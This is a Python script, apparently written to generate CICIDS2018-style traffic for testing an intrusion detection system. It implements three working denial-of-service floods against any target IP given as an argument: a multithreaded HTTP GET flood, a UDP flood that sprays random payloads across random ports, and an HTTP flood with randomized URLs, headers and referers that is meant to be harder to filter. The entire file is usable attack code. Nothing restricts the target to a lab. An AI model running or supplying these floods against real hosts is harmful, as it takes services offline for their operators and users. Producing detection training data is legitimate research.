"""
DDoS Attack — Combined All Variations (Run on Attacker VM)

Combines all 3 DDoS methods from the CICIDS2018 dataset into one script.
When you run this for N seconds, it cycles through all methods,
giving each a time slice so the NIDS sees all DDoS traffic patterns.

Methods (matching dataset exactly):
  1. LOIC-HTTP  — Massive HTTP GET flood (simulates multiple sources via threads)
  2. LOIC-UDP   — UDP packet flood (connectionless, high volume)
  3. HOIC       — HTTP flood with randomized headers (booster-like behavior)

NOTE: Real DDoS used 10 attacker machines. From a single VM we simulate
the traffic PATTERN by using many threads. The flow features (packet sizes,
rates, flags) will match the training data patterns even from 1 machine.

Usage:
  python3 ddos_attack.py --target 172.31.69.25 --duration 60
  python3 ddos_attack.py --target 172.31.69.25 --duration 120 --method loic_http
"""

import argparse
import threading
import time
import socket
import random
import string
import struct
import sys


# ============================================================
# CONFIGURATION
# ============================================================

DEFAULT_PORT = 80
DEFAULT_DURATION = 60

METHODS = ["loic_http", "loic_udp", "hoic"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Safari/537.36 Edge/16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 Chrome/61.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 Chrome/60.0.3112.113",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q=",
    "https://www.reddit.com/",
    "https://www.facebook.com/",
]

# ============================================================
# COLORS
# ============================================================

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"


def log(msg, color=CYAN):
    ts = time.strftime("%H:%M:%S")
    print(f"{color}[{ts}] {msg}{RESET}")


# ============================================================
# METHOD 1: LOIC-HTTP
# Massive HTTP GET flood — all requests target same URL endpoint.
# Matches dataset: simple HTTP GET volume attack, many threads.
# The original used 10 machines; we use 50 threads to simulate volume.
# ============================================================

class LOICHttpAttack:
    """LOIC HTTP mode — high-volume HTTP GET flood."""

    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = 50  # Simulates traffic volume from multiple machines
        self.stop_event = threading.Event()
        self.request_count = 0

    def _worker(self):
        """LOIC HTTP worker — blast HTTP GETs as fast as possible."""
        while not self.stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target, self.port))

                # LOIC HTTP: simple GET flood, same endpoint, minimal randomization
                # (unlike HOIC which randomizes — LOIC is simpler)
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )

                # Send multiple requests per connection
                for _ in range(random.randint(3, 8)):
                    if self.stop_event.is_set():
                        break
                    s.send(request.encode())
                    self.request_count += 1
                    try:
                        s.recv(1024)
                    except Exception:
                        pass

                s.close()
            except Exception:
                pass

    def run(self):
        log(f"[LOIC-HTTP] Starting — {self.threads} threads flooding {self.target}:{self.port}")

        self.stop_event.clear()
        self.request_count = 0
        workers = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            workers.append(t)

        time.sleep(self.duration)
        self.stop_event.set()

        for t in workers:
            t.join(timeout=3)

        log(f"[LOIC-HTTP] Finished — sent {self.request_count} HTTP GET requests")


# ============================================================
# METHOD 2: LOIC-UDP
# Massive UDP packet flood — connectionless, high volume.
# Matches dataset: UDP datagrams flooding the target.
# ============================================================

class LOICUdpAttack:
    """LOIC UDP mode — UDP datagram flood."""

    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = 30
        self.stop_event = threading.Event()
        self.packet_count = 0

    def _worker(self):
        """LOIC UDP worker — blast UDP packets."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except Exception:
            return

        while not self.stop_event.is_set():
            try:
                # Random payload (LOIC sends random data in UDP mode)
                payload_size = random.randint(64, 1024)
                payload = random.randbytes(payload_size)

                # Send to target port and random high ports
                target_port = self.port if random.random() < 0.5 else random.randint(1, 65535)
                s.sendto(payload, (self.target, target_port))
                self.packet_count += 1

            except Exception:
                pass

        s.close()

    def run(self):
        log(f"[LOIC-UDP] Starting — {self.threads} threads flooding {self.target}:{self.port} (UDP)")

        self.stop_event.clear()
        self.packet_count = 0
        workers = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            workers.append(t)

        time.sleep(self.duration)
        self.stop_event.set()

        for t in workers:
            t.join(timeout=3)

        log(f"[LOIC-UDP] Finished — sent {self.packet_count} UDP packets")


# ============================================================
# METHOD 3: HOIC
# HTTP flood with "booster" randomization — random URL params,
# random headers, random referers. Harder to filter than LOIC.
# Matches dataset: HOIC with booster scripts.
# ============================================================

class HOICAttack:
    """HOIC — HTTP flood with booster randomization."""

    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = 50
        self.stop_event = threading.Event()
        self.request_count = 0

    def _random_url(self):
        """Generate randomized URL (HOIC booster behavior — up to 256 URLs)."""
        paths = ["/", "/index.html", "/page", "/search", "/api", "/data",
                 "/static", "/images", "/css", "/js", "/login", "/admin"]
        path = random.choice(paths)
        params = "&".join(
            f"{''.join(random.choices(string.ascii_lowercase, k=4))}="
            f"{''.join(random.choices(string.ascii_letters + string.digits, k=8))}"
            for _ in range(random.randint(1, 4))
        )
        return f"{path}?{params}"

    def _worker(self):
        """HOIC worker — sends randomized HTTP requests (booster emulation)."""
        while not self.stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target, self.port))

                # HOIC booster: every header is randomized
                url = self._random_url()
                ua = random.choice(USER_AGENTS)
                referer = random.choice(REFERERS) + ''.join(random.choices(string.ascii_lowercase, k=6))
                encoding = random.choice(["gzip, deflate", "gzip", "deflate", "identity"])
                lang = random.choice(["en-US,en;q=0.5", "en-GB,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7"])

                request = (
                    f"GET {url} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,*/*;q=0.{random.randint(5, 9)}\r\n"
                    f"Accept-Language: {lang}\r\n"
                    f"Accept-Encoding: {encoding}\r\n"
                    f"Referer: {referer}\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )
                s.send(request.encode())
                self.request_count += 1

                # Read response (generates backward traffic for flow features)
                try:
                    s.recv(4096)
                except Exception:
                    pass

                s.close()
            except Exception:
                pass

    def run(self):
        log(f"[HOIC] Starting — {self.threads} threads with booster flooding {self.target}:{self.port}")

        self.stop_event.clear()
        self.request_count = 0
        workers = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            workers.append(t)

        time.sleep(self.duration)
        self.stop_event.set()

        for t in workers:
            t.join(timeout=3)

        log(f"[HOIC] Finished — sent {self.request_count} randomized HTTP requests")


# ============================================================
# COMBINED RUNNER — cycles through all DDoS methods
# ============================================================

def run_combined_ddos(target, port, duration, method=None):
    """
    Run DDoS attack. If method is None, cycles through ALL methods
    giving each an equal time slice (like LABEL_MAPPING combines
    DDoS-LOIC-HTTP, DDoS-LOIC-UDP, DDoS-HOIC into 'DDoS').
    """
    print()
    print("=" * 65)
    print(f"  DDoS ATTACK — {'ALL VARIATIONS' if method is None else method.upper()}")
    print(f"  Target: {target}:{port}")
    print(f"  Duration: {duration}s")
    print("=" * 65)

    attack_classes = {
        "loic_http": LOICHttpAttack,
        "loic_udp": LOICUdpAttack,
        "hoic": HOICAttack,
    }

    if method:
        methods_to_run = [method]
    else:
        methods_to_run = METHODS

    time_per_method = duration / len(methods_to_run)
    log(f"Running {len(methods_to_run)} method(s), {time_per_method:.1f}s each")

    start_time = time.time()

    for i, method_name in enumerate(methods_to_run):
        elapsed = time.time() - start_time
        remaining = duration - elapsed
        if remaining <= 0:
            break

        method_duration = min(time_per_method, remaining)
        attack_cls = attack_classes.get(method_name)
        if not attack_cls:
            log(f"Unknown method: {method_name}", RED)
            continue

        log(f"--- Phase {i + 1}/{len(methods_to_run)}: {method_name.upper()} ({method_duration:.0f}s) ---", YELLOW)
        attack = attack_cls(target, port, method_duration)
        attack.run()
        print()

    total_time = time.time() - start_time
    print("=" * 65)
    log(f"DDoS ATTACK COMPLETE — Total: {total_time:.1f}s", GREEN)
    print("=" * 65)


# ============================================================
# MAIN
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="DDoS Attack — All CICIDS2018 variations combined",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Methods:
  loic_http  — Massive HTTP GET flood (LOIC HTTP mode)
  loic_udp   — UDP datagram flood (LOIC UDP mode)
  hoic       — HTTP flood with booster randomization (HOIC)

Examples:
  python3 ddos_attack.py --target 172.31.69.25 --duration 60
  python3 ddos_attack.py --target 172.31.69.25 --duration 120 --method loic_udp
        """
    )

    parser.add_argument("--target", "-t", required=True, help="Victim IP address")
    parser.add_argument("--port", "-p", type=int, default=DEFAULT_PORT, help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument("--duration", "-d", type=int, default=DEFAULT_DURATION, help=f"Duration in seconds (default: {DEFAULT_DURATION})")
    parser.add_argument("--method", "-m", choices=METHODS, default=None, help="Run only this method (default: all combined)")

    args = parser.parse_args()
    run_combined_ddos(args.target, args.port, args.duration, args.method)


if __name__ == "__main__":
    main()
